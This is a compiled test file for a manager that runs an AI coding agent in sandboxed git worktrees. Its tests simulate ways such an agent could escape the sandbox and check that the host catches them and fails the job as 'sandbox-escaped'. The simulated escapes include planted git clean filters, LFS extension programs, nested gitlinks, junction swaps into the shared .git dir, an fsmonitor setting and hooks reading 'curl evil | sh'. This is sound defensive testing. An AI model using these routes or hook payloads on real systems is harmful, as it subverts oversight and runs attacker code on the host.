        const links = readWorktreeGitLinks(job.wt);
        // The job created an empty config.worktree (the sandbox keeps only an existing file read-only): its hash is recorded.
        expect(links.configWorktree).toBe(createHash('sha256').update('').digest('hex'));
        const args = worktreeGitDirArgs(job.wt);
        plantConfigWorktreeFilter(links.adminDir);
        stale(job.wt);
        execFileSync('git', ['status', '--porcelain'], { cwd: job.wt, stdio: 'pipe' });
        expect(existsSync(marker())).toBe(true);
        rmSync(marker());
        expect(worktreeGitLinksIntact(job.wt, links, join(repo, '.git'))).toBe(false);
        stale(job.wt);
        expect(() => runHostGit(job.wt, [...args, 'status', '--porcelain'])).toThrow(/^sandbox-escaped: .*config\.worktree/);
        expect(() => runHostGit(job.wt, [...args, 'rev-parse', 'HEAD'])).toThrow(/^sandbox-escaped: /);
        expect(summarizeChanges(job.wt, gitIn(repo, 'rev-parse', 'HEAD'), [], args)).toBeNull();
        expectRemovedByPath(m, job, links.adminDir);
    });
    it('a config.worktree written during the session fails the job as sandbox-escaped before the change summary', async () => {
        gitIn(repo, 'config', 'extensions.worktreeConfig', 'true');
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        plantConfigWorktreeFilter(adminDirOf(wt));
        stale(wt);
        const done = await m.cancel(started.jobId);
        expect(done.status).toBe('failed');
        expect(done.error).toMatch(/^sandbox-escaped: the job worktree's git links \(.*config\.worktree\)/);
        expect(done.changes ?? null).toBeNull();
        expect(existsSync(marker())).toBe(false);
        expect(m.cleanup(started.jobId).cleanup).toMatch(/^sandbox-escaped: /);
        expect(existsSync(marker())).toBe(false);
    });
    it('a filter in a recorded config.worktree still never runs in host status or the change summary (drivers blanked)', async () => {
        gitIn(repo, 'config', 'extensions.worktreeConfig', 'true');
        const m = manager();
        const job = await finishedJob(m);
        plantConfigWorktreeFilter(adminDirOf(job.wt));
        // Recorded after the plant (the record is replaced by hand): no attributes and the driver blanking stand between it and host git.
        rerecordLinks(job.wt);
        const args = worktreeGitDirArgs(job.wt);
        stale(job.wt);
        expect(hostGit(job.wt, [...args, 'status', '--porcelain'])).toBe('');
        stale(job.wt);
        expect(summarizeChanges(job.wt, gitIn(repo, 'rev-parse', 'HEAD'), [], args)?.changedFiles).toEqual([]);
        expect(existsSync(marker())).toBe(false);
    });
    const systemLfs = (() => {
        try {
            execFileSync('git', ['lfs', 'version'], { stdio: 'pipe' });
            return execFileSync('git', ['config', '--system', '--get', 'filter.lfs.process'], { encoding: 'utf8', stdio: 'pipe' }).includes('git-lfs');
        }
        catch {
            return false;
        }
    })();
    // Needs git-lfs with filter.lfs in the system config (Git for Windows ships it there); skipped otherwise.
    it.skipIf(!systemLfs)('host git blanks the system filter.lfs, so git-lfs runs no lfs.extension program of a config.worktree', async () => {
        gitIn(repo, 'config', 'extensions.worktreeConfig', 'true');
        const m = manager();
        const job = await finishedJob(m);
        const script = markerFilter();
        writeFileSync(join(job.wt, '.gitattributes'), '* filter=lfs\n');
        for (const op of ['clean', 'smudge'])
            gitIn(job.wt, 'config', '--worktree', `lfs.extension.pwn.${op}`, `sh ${script} %f`);
        gitIn(job.wt, 'config', '--worktree', 'lfs.extension.pwn.priority', '0');
        stale(job.wt);
        try {
            execFileSync('git', ['diff', '--stat', 'HEAD'], { cwd: job.wt, stdio: 'pipe' });
        }
        catch { /* the marker is what counts */ }
        expect(existsSync(marker())).toBe(true);
        rmSync(marker());
        // Recorded after the plant (the record is replaced by hand): no attributes and the driver blanking keep git-lfs out of host git.
        const links = rerecordLinks(job.wt);
        const args = worktreeGitDirArgs(job.wt);
        stale(job.wt);
        expect(hostGit(job.wt, [...args, 'status', '--porcelain'])).not.toBeNull();
        stale(job.wt);
        expect(summarizeChanges(job.wt, gitIn(repo, 'rev-parse', 'HEAD'), [], args)?.untrackedFiles).toContain('.gitattributes');
        stale(job.wt);
        expect(hostGit(job.wt, [...args, 'add', '-A'])).not.toBeNull();
        expect(existsSync(marker())).toBe(false);
        // The job's own links, recorded at creation, refuse it outright.
        expectRemovedByPath(m, job, links.adminDir);
    });
    /** A nested repository whose own config and attributes run a clean filter, added to the lane's index as a gitlink. */
    function plantNestedGitlink(wt) {
        const sub = join(wt, 'sub');
        gitIn(root, 'init', '-q', sub);
        gitIn(sub, 'config', 'filter.evil.clean', `sh "${markerFilter()}"`);
        writeFileSync(join(sub, '.gitattributes'), '* filter=evil\n');
        writeFileSync(join(sub, 'f.txt'), 'f\n');
        gitIn(sub, 'add', '.');
        gitIn(sub, 'commit', '-q', '-m', 'sub');
        gitIn(wt, 'add', 'sub');
        rmSync(marker(), { force: true });
        stale(sub, 'f.txt');
        return sub;
    }
    it('a nested repository the lane adds as a gitlink runs none of its filters in host git; the summary flags it', async () => {
        const m = manager();
        const job = await finishedJob(m);
        const base = gitIn(repo, 'rev-parse', 'HEAD');
        const sub = plantNestedGitlink(job.wt);
        // Control: a plain diff enters the gitlink (git status in sub) and runs its filter.
        execFileSync('git', ['diff', '--stat', base], { cwd: job.wt, stdio: 'pipe' });
        expect(existsSync(marker())).toBe(true);
        rmSync(marker());
        const args = worktreeGitDirArgs(job.wt);
        stale(sub, 'f.txt');
        expect(hostGit(job.wt, [...args, 'diff', '--stat', base, '--'])).not.toBeNull();
        stale(sub, 'f.txt');
        expect(hostGit(job.wt, [...args, 'status', '--porcelain'])).not.toBeNull();
        stale(sub, 'f.txt');
        writeFileSync(join(job.wt, 'README.md'), 'a real edit\n');
        const summary = summarizeChanges(job.wt, base, [], args);
        // Real diffs still show without attributes.
        expect(summary?.diffStat).toMatch(/README\.md \| +\d+ [+-]+/);
        expect(summary?.newGitlinks).toEqual(['sub']);
        expect(summary?.changedFiles).toContain('sub');
        expect(summary?.protectedChanges).toContain('sub');
        expect(existsSync(marker())).toBe(false);
    });
    it('a gitlink added during the session fails the job as sandbox-escaped', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        plantNestedGitlink(started.worktree.path);
        const done = await m.cancel(started.jobId);
        expect(done.status).toBe('failed');
        expect(done.error).toMatch(/^sandbox-escaped: the session added nested repositories as gitlinks \(sub\)/);
        expect(done.changes?.protectedChanges).toContain('sub');
        expect(existsSync(marker())).toBe(false);
    });
    it('no lane attribute applies in host git: a config.worktree a surviving child flips during 100 host diffs never runs its filter', async () => {
        gitIn(repo, 'config', 'extensions.worktreeConfig', 'true');
        const m = manager();
        const job = await finishedJob(m);
        const base = gitIn(repo, 'rev-parse', 'HEAD');
        const args = worktreeGitDirArgs(job.wt);
        const configWorktree = join(adminDirOf(job.wt), 'config.worktree');
        writeFileSync(join(job.wt, '.gitattributes'), '* filter=evil2\n');
        const evil = `[filter "evil2"]\n\tclean = sh "${markerFilter()}"\n`;
        // Host git reads no .gitattributes of the lane (GIT_ATTR_SOURCE is the empty tree).
        expect(gitIn(job.wt, 'check-attr', 'filter', 'README.md')).toBe('README.md: filter: evil2');
        expect(runHostGit(job.wt, [...args, 'check-attr', 'filter', 'README.md']).trim()).toBe('README.md: filter: unspecified');
        // Control: plain git with the flipped config runs the filter.
        writeFileSync(configWorktree, evil);
        stale(job.wt);
        execFileSync('git', ['diff', '--stat', base], { cwd: job.wt, stdio: 'pipe' });
        expect(existsSync(marker())).toBe(true);
        rmSync(marker());
        rmSync(configWorktree);
        const flip = `const fs=require('fs');const p=${JSON.stringify(configWorktree)};const c=${JSON.stringify(evil)};for(;;){try{fs.writeFileSync(p,c)}catch{}try{fs.rmSync(p,{force:true})}catch{}}`;
        const flipper = spawn(process.execPath, ['-e', flip], { stdio: 'ignore' });
        const exited = new Promise((r) => flipper.once('exit', r));
        try {
            for (let i = 0; i < 100; i++) {
                stale(job.wt);
                try {
                    runHostGit(job.wt, [...args, 'diff', '--no-ext-diff', '--stat', base, '--']);
                }
                catch { /* refused: the flip was seen */ }
            }
        }
        finally {
            flipper.kill();
            await exited;
        }
        expect(existsSync(marker())).toBe(false);
    }, 120_000);
    it('a repository relying on .gitattributes eol: host status may see a stat-dirty file as modified, which keeps the worktree', async () => {
        // As on Linux and macOS: no core.autocrlf (Git for Windows sets it in the system config, and it converts without attributes).
        gitIn(repo, 'config', 'core.autocrlf', 'false');
        writeFileSync(join(repo, '.gitattributes'), '*.txt text eol=crlf\n');
        writeFileSync(join(repo, 'a.txt'), 'one\ntwo\n');
        gitIn(repo, 'add', '.gitattributes', 'a.txt');
        gitIn(repo, 'commit', '-q', '-m', 'eol');
        const m = manager();
        const job = await finishedJob(m);
        const args = worktreeGitDirArgs(job.wt);
        expect(readFileSync(join(job.wt, 'a.txt'), 'utf8')).toBe('one\r\ntwo\r\n');
        stale(job.wt, 'a.txt');
        // Plain git converts with the attributes and sees no change.
        expect(gitIn(job.wt, 'status', '--porcelain')).toBe('');
        stale(job.wt, 'a.txt');
        const status = hostGit(job.wt, [...args, 'status', '--porcelain']);
        expect(status).toBe(EOL_STATUS);
        // A worktree that looks dirty is kept, never removed.
        expect(() => m.cleanup(job.id)).toThrow(/kept/);
        expect(existsSync(job.wt)).toBe(true);
    });
    it('refuses a sandboxed job when the host git ignores GIT_ATTR_SOURCE (older than 2.41.0)', () => {
        expect(hostGitAttrSourceProblem('git version 2.40.1')).toMatch(/does not honour GIT_ATTR_SOURCE; .* 2\.41\.0 or newer/);
        expect(hostGitAttrSourceProblem('git version 1.99.0')).not.toBeNull();
        expect(hostGitAttrSourceProblem('git version 2.41.0')).toBeNull();
        expect(hostGitAttrSourceProblem('git version 2.51.2.windows.1')).toBeNull();
        expect(hostGitAttrSourceProblem('git version 3.0.0')).toBeNull();
        expect(hostGitAttrSourceProblem(null)).toMatch(/cannot read the git version/);
        expect(hostGitAttrSourceProblem()).toBeNull();
        const old = (env) => new CopilotRunManager({ ...fakeDeps(root, 'idle', calls, env), hostGitAttrSourceProblem: () => 'git version 2.40.1 does not honour GIT_ATTR_SOURCE' });
        expect(() => old({ OMG_COPILOT_RUN_ALLOW: '1' }).start({ prompt: 'x', cwd: repo })).toThrow(/copilot_run_start: git version 2\.40\.1 does not honour GIT_ATTR_SOURCE/);
        expect(existsSync(worktreesDir())).toBe(false);
        expect(() => old({ OMG_COPILOT_RUN_ALLOW: '1', [SANDBOX_KILL_ENV]: 'off' }).start({ prompt: 'x', cwd: repo })).not.toThrow();
    });
    it('the git links are recorded once at creation and dropped with the worktree', async () => {
        const m = manager();
        const job = await finishedJob(m);
        const created = recordedWorktreeGitLinks(job.wt);
        expect(created).toEqual(readWorktreeGitLinks(job.wt));
        // A second record with other links never replaces it.
        expect(() => recordWorktreeGitLinks(job.wt, { ...created, configWorktree: 'other' })).toThrow(/never replaced/);
        expect(recordedWorktreeGitLinks(job.wt)).toEqual(created);
        expect(m.cleanup(job.id).cleanup).toContain('removed worktree');
        expect(recordedWorktreeGitLinks(job.wt)).toBeNull();
        expect(() => worktreeGitDirArgs(job.wt)).toThrow(/no git links were recorded/);
    });
    it('the session commits on a detached HEAD; the host moves only the job\'s own branch after it', async () => {
        const base = gitIn(repo, 'rev-parse', 'HEAD');
        const m = manager('commit');
        const job = await finishedJob(m);
        expect(() => gitIn(job.wt, 'symbolic-ref', '-q', 'HEAD')).toThrow();
        const head = gitIn(job.wt, 'rev-parse', 'HEAD');
        expect(head).not.toBe(base);
        expect(gitIn(repo, 'rev-parse', `refs/heads/${job.branch}`)).toBe(head);
        expect(gitIn(repo, 'rev-parse', 'refs/heads/main')).toBe(base);
    });
});
describe('copilot_run session end', () => {
    it('kills the runtime\'s process tree before client.stop(), also on a clean end', async () => {
        const order = [];
        const deps = fakeDeps(root, 'idle', calls, { OMG_COPILOT_RUN_ALLOW: '1' });
        const sdk = (await deps.loadSdk());
        const Base = sdk.module.CopilotClient;
        class WithChild extends Base {
            constructor(o) { super(o); this.cliProcess = { pid: 4321 }; }
            async stop() { order.push('stop'); return super.stop(); }
        }
        let alive = true;
        const m = new CopilotRunManager({
            ...deps,
            loadSdk: async () => ({ ...sdk, module: { ...sdk.module, CopilotClient: WithChild } }),
            processIdentity: async () => null,
            isAlive: () => alive,
            killTree: (pid) => { order.push(`kill:${pid}`); alive = false; },
        });
        const done = await m.wait(m.start({ prompt: 'x', cwd: repo }).jobId, 10_000);
        expect(done.status).toBe('completed');
        expect(order).toEqual(['kill:4321', 'stop']);
        expect(done.worktree?.headCommit).toBe(gitIn(repo, 'rev-parse', 'HEAD'));
    });
});
describe('copilot_run common git dir snapshot (a file-tool write swapped into the git dir)', () => {
    it('a dir swapped for a junction to the common git dir after its write was approved fails the job as sandbox-escaped', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const decide = calls.sessions[0].onPermissionRequest;
        const wt = started.worktree.path;
        mkdirSync(join(wt, 'src', 'd'), { recursive: true });
        expect(await decide({ kind: 'write', path: join(wt, 'src', 'd', 'config') }, { sessionId: 's' })).toEqual({ kind: 'approve-once' });
        // The sandboxed shell swaps the approved dir for a junction; the unsandboxed file tool then writes through it.
        rmSync(join(wt, 'src', 'd'), { recursive: true });
        symlinkSync(join(repo, '.git'), join(wt, 'src', 'd'), 'junction');
        writeFileSync(join(wt, 'src', 'd', 'config'), `${readFileSync(join(repo, '.git', 'config'), 'utf8')}[core]\n\tfsmonitor = /evil.sh\n`);
        // Asked again now, the write is refused by name.
        expect(await decide({ kind: 'write', path: join(wt, 'src', 'd', 'config') }, { sessionId: 's' })).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/write through a link .* that resolves outside/) });
        const branch = gitIn(repo, 'rev-parse', `refs/heads/${started.worktree.branch}`);
        const done = await m.cancel(started.jobId);
        expect(done.status).toBe('failed');
        expect(done.error).toMatch(/^sandbox-escaped: the common git dir .* changed during the session \(config\); the job's branch was not moved/);
        expect(done.changes ?? null).toBeNull();
        expect(gitIn(repo, 'rev-parse', `refs/heads/${started.worktree.branch}`)).toBe(branch);
    });
    it('detects a changed hook and a new config.worktree, and ignores a worktree entry another job added or removed', () => {
        const git = join(repo, '.git');
        mkdirSync(join(git, 'worktrees', 'mine'), { recursive: true });
        mkdirSync(join(git, 'worktrees', 'gone'), { recursive: true });
        writeFileSync(join(git, 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
        const before = sharedGitStateSnapshot(git);
        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual([]);
        writeFileSync(join(git, 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
        mkdirSync(join(git, 'hooks', 'sub'));
        writeFileSync(join(git, 'worktrees', 'mine', 'config.worktree'), '[core]\n\tfsmonitor = /evil.sh\n');
        writeFileSync(join(git, 'info', 'attributes'), '* filter=evil\n');
        // Another job's worktree entry: added (with a config.worktree) or removed meanwhile.
        mkdirSync(join(git, 'worktrees', 'other'), { recursive: true });
        writeFileSync(join(git, 'worktrees', 'other', 'config.worktree'), '');
        rmSync(join(git, 'worktrees', 'gone'), { recursive: true });
        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['hooks/pre-commit', 'hooks/sub', 'info/attributes', 'worktrees/mine/config.worktree']);
        // A kept entry replaced by a link is a change too.
        rmSync(join(git, 'worktrees', 'mine'), { recursive: true });
        symlinkSync(join(root, 'elsewhere'), join(git, 'worktrees', 'mine'), 'junction');
        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toContain('worktrees/mine');
        rmSync(join(git, 'worktrees', 'mine'));
    });
    it('detects another worktree\'s repointed HEAD unless it is a live job\'s', () => {
        const other = join(root, 'other-wt');
        gitIn(repo, 'worktree', 'add', '-q', '-b', 'user-feature', other);
        const id = readWorktreeGitLinks(other).adminDir.split(/[\\/]/).pop();
        const before = sharedGitStateSnapshot(join(repo, '.git'));
        expect(before[`worktrees/${id}/HEAD`]).toMatch(/^file /);
        writeFileSync(join(repo, '.git', 'worktrees', id, 'HEAD'), 'ref: refs/heads/main\n');
        const after = sharedGitStateSnapshot(join(repo, '.git'));
        expect(sharedGitStateChanges(before, after)).toEqual([`worktrees/${id}/HEAD`]);
        expect(sharedGitStateChanges(before, after, new Set([`worktrees/${id}/HEAD`]))).toEqual([]);
    });
    it('detects a planted commondir, a submodule hook, a moved branch and a new job branch; ignores packing refs', () => {
        const git = join(repo, '.git');
        mkdirSync(join(git, 'modules', 'sub', 'hooks'), { recursive: true });
        writeFileSync(join(git, 'modules', 'sub', 'config'), '[core]\n\tbare = false\n');
        gitIn(repo, 'branch', 'feature');
        const before = sharedGitStateSnapshot(git);
        expect(before['refs/heads/main']).toMatch(/^ref [0-9a-f]{40}/);
        // Packing refs is no change; a job branch created outside the manager (expectJobRef) is.
        gitIn(repo, 'pack-refs', '--all');
        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual([]);
        gitIn(repo, 'branch', 'omc-team/copilot-run/cr-other');
        writeFileSync(join(git, 'modules', 'sub', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
        writeFileSync(join(repo, 'b.txt'), 'b\n');
        gitIn(repo, 'add', 'b.txt');
        gitIn(repo, 'commit', '-q', '-m', 'moves main');
        // Last: a planted commondir points git itself elsewhere.
        writeFileSync(join(git, 'commondir'), `${join(root, 'evil')}\n`);
        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['commondir', 'modules/sub', 'refs/heads/main', 'refs/heads/omc-team/copilot-run/cr-other']);
    });
    /** A commit on the job worktree's detached HEAD, as the session makes it. */
    const laneCommit = (wt, name) => {
        writeFileSync(join(wt, name), `${name}\n`);
        gitIn(wt, 'add', name);
        gitIn(wt, 'commit', '-q', '-m', name);
        return gitIn(wt, 'rev-parse', 'HEAD');
    };
    it('a lane pointing its own branch at main (symref) fails as sandbox-escaped and main does not move', async () => {
        const main = gitIn(repo, 'rev-parse', 'refs/heads/main');
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const { path: wt, branch } = started.worktree;
        laneCommit(wt, 'evil.txt');
        // The file tool's write (raced into the git dir): the job's branch becomes `ref: refs/heads/main`.
        writeFileSync(join(repo, '.git', 'refs', 'heads', ...branch.split('/')), 'ref: refs/heads/main\n');
        const done = await m.cancel(started.jobId);
        expect(done.status).toBe('failed');
        expect(done.error).toMatch(new RegExp(`^sandbox-escaped: .*refs/heads/${branch}`));
        expect(gitIn(repo, 'rev-parse', 'refs/heads/main')).toBe(main);
    });
    it('a running lane retargeting a finished job\'s branch or worktree HEAD fails as sandbox-escaped', async () => {
        const m = manager('hang');
        const first = m.start({ prompt: 'implement', cwd: repo });
        expect((await m.cancel(first.jobId)).status).toBe('cancelled');
        const { path: firstWt, branch: firstBranch } = first.worktree;
        const firstSha = gitIn(repo, 'rev-parse', `refs/heads/${firstBranch}`);
        const firstAdmin = readWorktreeGitLinks(firstWt).adminDir;
        for (const target of ['branch', 'head']) {
            const started = m.start({ prompt: 'implement', cwd: repo });
            await new Promise((r) => setTimeout(r, 50));
            const evil = laneCommit(started.worktree.path, `evil-${target}.txt`);
            if (target === 'branch')
                writeFileSync(join(repo, '.git', 'refs', 'heads', ...firstBranch.split('/')), `${evil}\n`);
            else
                writeFileSync(join(firstAdmin, 'HEAD'), `${evil}\n`);
            const done = await m.cancel(started.jobId);
            expect(done.status).toBe('failed');
            expect(done.error).toMatch(target === 'branch'
                ? new RegExp(`^sandbox-escaped: the common git dir .*refs/heads/${firstBranch}`)
                : /^sandbox-escaped: the common git dir .*worktrees\/[^/]+\/HEAD/);
            // Put it back for the next round.
            if (target === 'branch')
                writeFileSync(join(repo, '.git', 'refs', 'heads', ...firstBranch.split('/')), `${firstSha}\n`);
            else
                writeFileSync(join(firstAdmin, 'HEAD'), `${firstSha}\n`);
        }
    });
    it('concurrent jobs that commit and end in turn all pass, and cleanup meanwhile is no change', async () => {
        const m = manager('hang');
        const done = m.start({ prompt: 'implement', cwd: repo });
        await m.cancel(done.jobId);
        const a = m.start({ prompt: 'implement', cwd: repo });
        const b = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const aHead = laneCommit(a.worktree.path, 'a.txt');
        const bHead = laneCommit(b.worktree.path, 'b.txt');
        const aDone = await m.cancel(a.jobId);
        expect(aDone.error ?? '').not.toMatch(/sandbox-escaped/);
        expect(gitIn(repo, 'rev-parse', `refs/heads/${a.worktree.branch}`)).toBe(aHead);
        // A job started after a's end, and the first job's cleanup, while b runs.
        const c = m.start({ prompt: 'implement', cwd: repo });
        expect(m.cleanup(done.jobId).cleanup).toContain('removed worktree');
        const bDone = await m.cancel(b.jobId);
        expect(bDone.error ?? '').not.toMatch(/sandbox-escaped/);
        expect(bDone.changes?.changedFiles).toEqual(['b.txt']);
        expect(gitIn(repo, 'rev-parse', `refs/heads/${b.worktree.branch}`)).toBe(bHead);
        expect((await m.cancel(c.jobId)).error ?? '').not.toMatch(/sandbox-escaped/);
    });
});
describe('copilot_run hook paths', () => {
    it('a hook planted in an ignored dir under core.hooksPath is a protected change', async () => {
        gitIn(repo, 'config', 'core.hooksPath', '.husky/_');
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        // The sandboxed shell writes husky's self-ignoring hook dir; no file tool is asked.
        mkdirSync(join(wt, '.husky', '_'), { recursive: true });
        writeFileSync(join(wt, '.husky', '_', '.gitignore'), '*\n');
        writeFileSync(join(wt, '.husky', '_', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
        const done = await m.cancel(started.jobId);
        expect(done.changes?.untrackedFiles).toEqual([]);
        expect(done.changes?.protectedChanges).toEqual(['.husky/_/.gitignore', '.husky/_/pre-commit']);
    });
    it('reads core.hooksPath as git does in the job worktree (includeIf gitdir)', async () => {
        const inc = join(root, 'worktree-hooks.gitconfig');
        writeFileSync(inc, '[core]\n\thooksPath = tools/hooks\n');
        const gitDirPattern = `${realpathSync.native(join(repo, '.git')).replace(/\\/g, '/')}/worktrees/**`;
        gitIn(repo, 'config', `includeIf.gitdir:${gitDirPattern}.path`, inc.replace(/\\/g, '/'));
        // The main checkout does not see it; the job worktree does.
        expect(relativeHooksPathRule(repo)).toBeNull();
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        const decide = calls.sessions[0].onPermissionRequest;
        expect(await decide({ kind: 'write', path: join(wt, 'tools', 'hooks', 'pre-commit') }, { sessionId: 's' })).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path tools\/hooks\/pre-commit/) });
        await m.cancel(started.jobId);
    });
    it('fails closed when git cannot read core.hooksPath', () => {
        expect(relativeHooksPathRule(repo)).toBeNull();
        writeFileSync(join(repo, '.git', 'config'), `${readFileSync(join(repo, '.git', 'config'), 'utf8')}\n[core\n`);
        expect(() => relativeHooksPathRule(repo)).toThrow(/cannot read core\.hooksPath/);
    });
});
describe('copilot_run write-time protected paths', () => {
    const tryWrite = async (decide, path) => decide({ kind: 'write', path }, { sessionId: 's' });
    it('a factory lane may not write LANE_PROTECTED_PATHS through the file tools; a plain job may', async () => {
        const lane = manager('hang');
        const started = lane.start({ prompt: 'implement', cwd: repo }, { sandboxScope: 'factory' });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        const decide = calls.sessions[0].onPermissionRequest;
        for (const rel of ['.claude/settings.json', '.vscode/tasks.json', '.mcp.json', '.github/copilot-instructions.md', '.husky/pre-commit', 'AGENTS.md']) {
            expect(await tryWrite(decide, join(wt, rel)), rel).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path/) });
        }
        expect(await tryWrite(decide, join(wt, 'src', 'a.ts'))).toEqual({ kind: 'approve-once' });
        await lane.cancel(started.jobId);
        const plain = manager('hang');
        const job = plain.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        expect(await tryWrite(calls.sessions[1].onPermissionRequest, join(job.worktree.path, '.vscode', 'tasks.json'))).toEqual({ kind: 'approve-once' });
        await plain.cancel(job.jobId);
    });
    it('refuses a write under a relative core.hooksPath in every job', async () => {
        gitIn(repo, 'config', 'core.hooksPath', './tools/hooks/');
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        const decide = calls.sessions[0].onPermissionRequest;
        expect(await tryWrite(decide, join(wt, 'tools', 'hooks', 'post-checkout'))).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path tools\/hooks\/post-checkout/) });
        expect(await tryWrite(decide, join(wt, 'tools', 'build.sh'))).toEqual({ kind: 'approve-once' });
        await m.cancel(started.jobId);
    });
});
//# sourceMappingURL=job.test.js.map